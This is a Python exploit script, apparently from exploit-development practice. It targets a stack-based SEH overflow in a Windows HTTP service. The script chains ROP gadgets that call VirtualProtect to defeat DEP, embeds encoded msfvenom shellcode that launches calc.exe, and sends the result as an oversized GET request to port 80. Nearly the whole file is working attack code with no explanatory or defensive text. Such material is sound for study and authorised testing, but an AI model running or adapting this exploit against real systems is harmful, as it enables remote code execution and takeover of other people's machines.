#!/usr/bin/python3
from pwn import remote, p32

"""
[+] Command used:
!py mona exchain
Nr of SEH records : 1
Start of chain (TEB FS:[0]) : 0x06cc6f94
Address     Next SEH    Handler
-------     --------    -------
0x06cc6f94  0x34664633  0x46356646  (record smashed at offset 4061)
"""

offset = 4061

nseh = b"B" * 4
seh = p32(0x10022869) # add esp, 0x1004; ret;

"""
BOOL VirtualProtect(
  [in]  LPVOID lpAddress,     (ESP)
  [in]  SIZE_T dwSize,        (0x1)
  [in]  DWORD  flNewProtect,  (0x40)
  [out] PDWORD lpflOldProtect (&Writable)
);
"""

rop  = b""
rop += b"D" * 37
rop += p32(0x10015442)      # pop eax; ret;
rop += p32(0x61c832d0)      # VirtualProtect()
rop += p32(0x61c0a798)      # xchg edi, eax; ret;
rop += p32(0x10022c4c)      # xor edx; edx;
rop += p32(0x61c330fe) * 64 # inc edx; adc al, 0x21; ret;
rop += p32(0x10015442)      # pop eax; ret;
rop += p32(0xffffffff)      # 0x0 - 0x1
rop += p32(0x100231d1)      # neg eax; ret;
rop += p32(0x1001da09)      # add ebx, eax; mov eax, dword ptr [esp + 0xc]; inc dword ptr [eax]; ret;
rop += p32(0x10010103)      # ret;
rop += p32(0x10010103)      # ret;
rop += p32(0x10010102)      # pop ecx; ret;
rop += p32(0x1004d726)      # Writable
rop += p32(0x10013808)      # pop ebp; ret;
rop += p32(0x10013808)      # pop ebp; ret;
rop += p32(0x100105e1)      # pop esi; ret;
rop += p32(0x10021e9d)      # jmp dword ptr [eax];
rop += p32(0x61c0a798)      # xchg edi, eax; ret;
rop += p32(0x100103ff)      # pop edi; ret;
rop += p32(0x10010103)      # ret;
rop += p32(0x100240c2)      # pushad; ret;
rop += p32(0x61c227fa)      # push esp; ret;

# msfvenom -p windows/exec CMD=calc.exe -f python -v shellcode -b '\x00\x20\x25\x2b\x2f\x5c' -e x86/jmp_call_additive
shellcode =  b""
shellcode += b"\xfc\xbb\xe4\x47\x3f\x47\xeb\x0c\x5e\x56\x31"
shellcode += b"\x1e\xad\x01\xc3\x85\xc0\x75\xf7\xc3\xe8\xef"
shellcode += b"\xff\xff\xff\x18\xaf\xbd\x47\xe0\x30\xa2\xce"
shellcode += b"\x05\x01\xe2\xb5\x4e\x32\xd2\xbe\x02\xbf\x99"
shellcode += b"\x93\xb6\x34\xef\x3b\xb9\xfd\x5a\x1a\xf4\xfe"
shellcode += b"\xf7\x5e\x97\x7c\x0a\xb3\x77\xbc\xc5\xc6\x76"
shellcode += b"\xf9\x38\x2a\x2a\x52\x36\x99\xda\xd7\x02\x22"
shellcode += b"\x51\xab\x83\x22\x86\x7c\xa5\x03\x19\xf6\xfc"
shellcode += b"\x83\x98\xdb\x74\x8a\x82\x38\xb0\x44\x39\x8a"
shellcode += b"\x4e\x57\xeb\xc2\xaf\xf4\xd2\xea\x5d\x04\x13"
shellcode += b"\xcc\xbd\x73\x6d\x2e\x43\x84\xaa\x4c\x9f\x01"
shellcode += b"\x28\xf6\x54\xb1\x94\x06\xb8\x24\x5f\x04\x75"
shellcode += b"\x22\x07\x09\x88\xe7\x3c\x35\x01\x06\x92\xbf"
shellcode += b"\x51\x2d\x36\x9b\x02\x4c\x6f\x41\xe4\x71\x6f"
shellcode += b"\x2a\x59\xd4\xe4\xc7\x8e\x65\xa7\x8d\x51\xfb"
shellcode += b"\xd2\xe0\x52\x03\xdc\x54\x3b\x32\x57\x3b\x3c"
shellcode += b"\xcb\xb2\x7f\xb2\x81\x9e\xd6\x5b\x4c\x4b\x6b"
shellcode += b"\x06\x6f\xa6\xa8\x3f\xec\x42\x51\xc4\xec\x27"
shellcode += b"\x54\x80\xaa\xd4\x24\x99\x5e\xda\x9b\x9a\x4a"
shellcode += b"\xb9\x7a\x09\x16\x13\x18\xa9\xbd\x6b\xe2\x49"
shellcode += b"\x3e\x6b\xe2\x49\x3e"

payload  = b""
payload += b"A" * 2400
payload += rop
payload += shellcode
payload += b"B" * (offset - len(payload))
payload += nseh + seh
payload += b"D" * (4200 - len(payload))

content = b"GET /" + payload + b" HTTP/1.1\r\n"

shell = remote("Windows", 80)
shell.sendline(content)
